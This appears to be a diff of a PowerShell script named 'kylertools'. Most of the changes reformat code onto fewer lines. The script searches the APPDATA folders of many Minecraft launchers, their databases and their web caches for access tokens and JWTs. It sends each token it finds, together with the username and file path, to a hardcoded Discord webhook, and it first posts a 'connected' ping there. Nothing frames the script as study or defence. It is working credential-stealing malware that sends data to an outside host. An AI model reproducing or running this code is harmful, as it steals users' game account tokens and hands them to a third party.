@@ -1,19 +1,13 @@
 $webhook = $env:KYLER_WEBHOOK
 if(-not $webhook){ $webhook = "https://discord.com/api/webhooks/1558775165108617317/PrGnU2Y-6TKmE8zktMFJXv5b2ZUSOQUl-uWn7BaGmmarXo4v0kTV9JoxAGlLQhsLikit" }
 $h = @{ "Content-Type" = "application/json" }
-
 Add-Type -AssemblyName System.Security -EA 0
-
-try{
-    $ping = @{ content = "**kylertools** connected" } | ConvertTo-Json
-    iwr -Uri $webhook -Method Post -Headers $h -Body $ping -TimeoutSec 8 -EA 0 | Out-Null
-}catch{}
+try{ $ping = @{ content = "**kylertools** connected" } | ConvertTo-Json; iwr -Uri $webhook -Method Post -Headers $h -Body $ping -TimeoutSec 8 -EA 0 | Out-Null }catch{}
 
 $found = @()
 $seen = @{}
 $nl = [char]10
 $bt3 = [char]96 + [char]96 + [char]96
-
 $jwtRegex = "eyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}"
 
 function Add-Token {
@@ -24,12 +18,7 @@ function Add-Token {
     $key = "$type|$tok"
     if($seen.ContainsKey($key)){ return }
     $seen[$key] = $true
-    $script:found += [PSCustomObject]@{
-        User  = $user
-        Type  = $type
-        Token = $tok
-        File  = $src
-    }
+    $script:found += [PSCustomObject]@{ User = $user; Type = $type; Token = $tok; File = $src }
 }
 
 function Scan-Text {
@@ -57,23 +46,14 @@ function Scan-File {
             while($stack.Count -gt 0){
                 $node = $stack.Pop()
                 if($null -eq $node){ continue }
-                if($node -is [System.Collections.IEnumerable] -and $node -isnot [string]){
-                    foreach($item in $node){ $stack.Push($item) }
-                    continue
-                }
+                if($node -is [System.Collections.IEnumerable] -and $node -isnot [string]){ foreach($item in $node){ $stack.Push($item) }; continue }
                 if($node -isnot [PSCustomObject]){ continue }
                 $uname = "unknown"
-                foreach($k in @("username","name","displayName","profileName")){
-                    if($node.PSObject.Properties[$k] -and $node.$k){ $uname = $node.$k; break }
-                }
+                foreach($k in @("username","name","displayName","profileName")){ if($node.PSObject.Properties[$k] -and $node.$k){ $uname = $node.$k; break } }
                 if($node.minecraftProfile -and $node.minecraftProfile.name){ $uname = $node.minecraftProfile.name }
-                foreach($k in @("accessToken","token","access_token")){
-                    if($node.PSObject.Properties[$k] -and $node.$k){ Add-Token $node.$k $uname $path "accessToken" }
-                }
+                foreach($k in @("accessToken","token","access_token")){ if($node.PSObject.Properties[$k] -and $node.$k){ Add-Token $node.$k $uname $path "accessToken" } }
                 foreach($prop in $node.PSObject.Properties){
-                    if($prop.Value -is [PSCustomObject] -or ($prop.Value -is [System.Collections.IEnumerable] -and $prop.Value -isnot [string])){
-                        $stack.Push($prop.Value)
-                    }
+                    if($prop.Value -is [PSCustomObject] -or ($prop.Value -is [System.Collections.IEnumerable] -and $prop.Value -isnot [string])){ $stack.Push($prop.Value) }
                 }
             }
         }catch{}
@@ -89,8 +69,7 @@ function Scan-Db {
         $ms = New-Object IO.MemoryStream
         $fs.CopyTo($ms)
         $fs.Close()
-        $bytes = $ms.ToArray()
-        $txt = [Text.Encoding]::UTF8.GetString($bytes)
+        $txt = [Text.Encoding]::UTF8.GetString($ms.ToArray())
         Scan-Text $txt $path $user
     }catch{}
 }
@@ -139,23 +118,12 @@ if(Test-Path $bin){
 }
 
 $roots = @(
-    "$env:APPDATA\.minecraft",
-    "$env:APPDATA\.lunarclient",
-    "$env:APPDATA\ModrinthApp",
-    "$env:APPDATA\PrismLauncher",
-    "$env:APPDATA\MultiMC",
-    "$env:APPDATA\xmcl",
-    "$env:APPDATA\.technic",
-    "$env:APPDATA\.feather",
-    "$env:APPDATA\.gdlauncher-carbon",
-    "$env:APPDATA\.ATLauncher",
-    "$env:APPDATA\PollyMC",
-    "$env:APPDATA\HMCL"
+    "$env:APPDATA\.minecraft","$env:APPDATA\.lunarclient","$env:APPDATA\ModrinthApp",
+    "$env:APPDATA\PrismLauncher","$env:APPDATA\MultiMC","$env:APPDATA\xmcl",
+    "$env:APPDATA\.technic","$env:APPDATA\.feather","$env:APPDATA\.gdlauncher-carbon",
+    "$env:APPDATA\.ATLauncher","$env:APPDATA\PollyMC","$env:APPDATA\HMCL"
 )
-$includeNames = @(
-    "accounts.json","launcher_accounts.json","launcher_accounts_microsoft_store.json",
-    "user.json","user-profiles.json","tl_accounts.json","*.auth.json","minecraft_auth.json"
-)
+$includeNames = @("accounts.json","launcher_accounts.json","launcher_accounts_microsoft_store.json","user.json","user-profiles.json","tl_accounts.json","*.auth.json","minecraft_auth.json")
 foreach($r in $roots){
     if(-not (Test-Path $r)){ continue }
     try{
@@ -168,20 +136,12 @@ foreach($r in $roots){
     }catch{}
 }
 
-$profileRoots = @(
-    "$env:APPDATA\PrismLauncher\instances",
-    "$env:APPDATA\MultiMC\instances",
-    "$env:APPDATA\.minecraft\config",
-    "$env:APPDATA\.minecraft\versions"
-)
+$profileRoots = @("$env:APPDATA\PrismLauncher\instances","$env:APPDATA\MultiMC\instances","$env:APPDATA\.minecraft\config","$env:APPDATA\.minecraft\versions")
 foreach($pr in $profileRoots){
     if(-not (Test-Path $pr)){ continue }
     try{
         $files = Get-ChildItem $pr -Recurse -File -Include "opsec-accounts.json","accounts.json","*.auth.json" -EA 0
-        foreach($f in $files){
-            if($f.Length -gt 1mb){ continue }
-            Scan-File $f.FullName "unknown"
-        }
+        foreach($f in $files){ if($f.Length -gt 1mb){ continue }; Scan-File $f.FullName "unknown" }
     }catch{}
 }
 
@@ -194,23 +154,15 @@ if(Test-Path $modrinthRoot){
             $cfg = Join-Path $d.FullName "config"
             if(-not (Test-Path $cfg)){ continue }
             $files = Get-ChildItem $cfg -Recurse -File -Include "minecraft_auth.json","accounts.json","opsec-accounts.json","*.auth.json" -EA 0
-            foreach($f in $files){
-                if($f.Length -gt 1mb){ continue }
-                Scan-File $f.FullName "unknown"
-            }
+            foreach($f in $files){ if($f.Length -gt 1mb){ continue }; Scan-File $f.FullName "unknown" }
         }
     }
 }
 
 $dbs = @(
-    "$env:APPDATA\ModrinthApp\app.db",
-    "$env:APPDATA\ModrinthApp\app.db-wal",
-    "$env:APPDATA\ModrinthApp\app.db-shm",
-    "$env:APPDATA\gdlauncher\gdl_conf.db",
-    "$env:APPDATA\gdlauncher\gdl_conf.db-wal",
-    "$env:APPDATA\gdlauncher-carbon\gdl_conf.db",
-    "$env:APPDATA\.gdlauncher\gdl_conf.db",
-    "$env:APPDATA\Gml-Launcher\launcher.db"
+    "$env:APPDATA\ModrinthApp\app.db","$env:APPDATA\ModrinthApp\app.db-wal","$env:APPDATA\ModrinthApp\app.db-shm",
+    "$env:APPDATA\gdlauncher\gdl_conf.db","$env:APPDATA\gdlauncher\gdl_conf.db-wal",
+    "$env:APPDATA\gdlauncher-carbon\gdl_conf.db","$env:APPDATA\.gdlauncher\gdl_conf.db","$env:APPDATA\Gml-Launcher\launcher.db"
 )
 foreach($db in $dbs){ Scan-Db $db "db-scan" }
 
@@ -222,15 +174,9 @@ $webcaches = @(
 foreach($lc in $webcaches){
     if(-not (Test-Path $lc)){ continue }
     try{
-        $files = Get-ChildItem $lc -File -Include "*.ldb","*.log" -EA 0 |
-            Where-Object { $_.Length -lt 5mb } |
-            Select-Object -First 50
+        $files = Get-ChildItem $lc -File -Include "*.ldb","*.log" -EA 0 | Where-Object { $_.Length -lt 5mb } | Select-Object -First 50
         foreach($f in $files){
-            try{
-                $b = [IO.File]::ReadAllBytes($f.FullName)
-                $s = [Text.Encoding]::UTF8.GetString($b)
-                Scan-Text $s $f.FullName "unknown"
-            }catch{}
+            try{ $b = [IO.File]::ReadAllBytes($f.FullName); $s = [Text.Encoding]::UTF8.GetString($b); Scan-Text $s $f.FullName "unknown" }catch{}
         }
     }catch{}
 }
@@ -239,22 +185,17 @@ function Send-Embed {
     param($title, $desc, $color, $footerText)
     $embed = @{
         title = $title
-        description = "``````$desc``````"
+        description = $bt3 + $desc + $bt3
         color = $color
         timestamp = (Get-Date).ToString("o")
     }
     if($footerText){ $embed.footer = @{ text = $footerText } }
     $body = @{ embeds = @($embed) } | ConvertTo-Json -Depth 10
     for($i = 0; $i -lt 2; $i++){
-        try{
-            iwr -Uri $webhook -Method Post -Headers $h -Body $body -TimeoutSec 8 -EA Stop | Out-Null
-            return
-        }catch{
+        try{ iwr -Uri $webhook -Method Post -Headers $h -Body $body -TimeoutSec 8 -EA Stop | Out-Null; return }
+        catch{
             $wait = 3
-            try{
-                $ra = $_.Exception.Response.Headers['Retry-After']
-                if($ra){ $wait = [double]$ra }
-            }catch{}
+            try{ $ra = $_.Exception.Response.Headers['Retry-After']; if($ra){ $wait = [double]$ra } }catch{}
             Start-Sleep -Seconds ($wait + 1)
         }
     }
@@ -269,7 +210,7 @@ if($found.Count -eq 0){
         $i++
         $block = @()
         $block += $bt3 + "ansi"
-        $block += "[ $i ] " + $t.User
+        $block += "[ " + $i + " ] " + $t.User
         $block += "Type: " + $t.Type
         $block += "Token: " + $t.Token
         $block += "File: " + $t.File
